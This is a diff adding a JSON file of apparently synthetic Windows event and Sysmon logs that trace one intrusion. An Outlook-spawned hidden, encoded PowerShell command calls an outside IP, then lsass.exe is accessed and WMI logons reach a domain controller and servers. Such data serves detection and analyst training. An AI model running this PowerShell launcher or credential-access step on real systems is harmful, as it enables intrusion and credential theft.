@@ -1,0 +1,121 @@
+[
+    {
+        "source": "win_event_log",
+        "event_type": "Process Creation",
+        "timestamp": "2023-11-15T09:00:00Z",
+        "hostname": "WORKSTATION-CEO",
+        "user_name": "asmith",
+        "raw_log": {
+            "EventID": 4688,
+            "metadata": {
+                "process_name": "outlook.exe",
+                "command_line": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"",
+                "parent_process": "explorer.exe"
+            }
+        }
+    },
+    {
+        "source": "win_event_log",
+        "event_type": "Process Execution",
+        "timestamp": "2023-11-15T09:05:12Z",
+        "hostname": "WORKSTATION-CEO",
+        "user_name": "asmith",
+        "raw_log": {
+            "EventID": 4688,
+            "metadata": {
+                "process_name": "powershell.exe",
+                "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA...",
+                "parent_process": "outlook.exe"
+            }
+        }
+    },
+    {
+        "source": "sysmon",
+        "event_type": "Network Connection",
+        "timestamp": "2023-11-15T09:05:15Z",
+        "hostname": "WORKSTATION-CEO",
+        "user_name": "asmith",
+        "raw_log": {
+            "EventID": 3,
+            "metadata": {
+                "process_name": "powershell.exe",
+                "destination_ip": "185.11.12.13",
+                "destination_port": 443
+            }
+        }
+    },
+    {
+        "source": "win_event_log",
+        "event_type": "Privilege Escalation",
+        "timestamp": "2023-11-15T09:30:00Z",
+        "hostname": "WORKSTATION-CEO",
+        "user_name": "asmith",
+        "raw_log": {
+            "EventID": 4672,
+            "metadata": {
+                "description": "Special privileges assigned to new logon",
+                "privilege_list": "SeDebugPrivilege"
+            }
+        }
+    },
+    {
+        "source": "sysmon",
+        "event_type": "Process Access",
+        "timestamp": "2023-11-15T09:35:00Z",
+        "hostname": "WORKSTATION-CEO",
+        "user_name": "asmith",
+        "raw_log": {
+            "EventID": 10,
+            "metadata": {
+                "source_process": "powershell.exe",
+                "target_process": "lsass.exe",
+                "granted_access": "0x1010"
+            }
+        }
+    },
+    {
+        "source": "win_event_log",
+        "event_type": "Remote Session",
+        "timestamp": "2023-11-15T10:00:00Z",
+        "hostname": "DC-01",
+        "user_name": "asmith",
+        "raw_log": {
+            "EventID": 4624,
+            "metadata": {
+                "logon_type": 3,
+                "ip_address": "192.168.1.55",
+                "process_name": "WmiPrvSE.exe"
+            }
+        }
+    },
+    {
+        "source": "win_event_log",
+        "event_type": "Remote Session",
+        "timestamp": "2023-11-15T10:05:00Z",
+        "hostname": "FILE-SERVER-01",
+        "user_name": "asmith",
+        "raw_log": {
+            "EventID": 4624,
+            "metadata": {
+                "logon_type": 3,
+                "ip_address": "192.168.1.55",
+                "process_name": "WmiPrvSE.exe"
+            }
+        }
+    },
+    {
+        "source": "win_event_log",
+        "event_type": "Remote Session",
+        "timestamp": "2023-11-15T10:10:00Z",
+        "hostname": "DB-SERVER-02",
+        "user_name": "asmith",
+        "raw_log": {
+            "EventID": 4624,
+            "metadata": {
+                "logon_type": 3,
+                "ip_address": "192.168.1.55",
+                "process_name": "WmiPrvSE.exe"
+            }
+        }
+    }
+]
